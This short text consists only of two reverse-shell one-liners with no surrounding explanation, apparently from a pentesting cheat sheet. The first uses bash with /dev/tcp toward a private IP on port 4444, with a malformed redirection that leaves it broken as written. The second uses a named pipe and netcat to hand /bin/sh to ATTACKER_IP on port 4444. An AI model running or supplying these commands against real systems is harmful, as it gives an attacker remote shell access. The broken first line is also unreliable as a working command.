```
bash -i /dev/tcp/192.168.163.58/4444 0>&1
```

```
mkfifo /tmp/f; nc ATTACKER_IP 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f    
```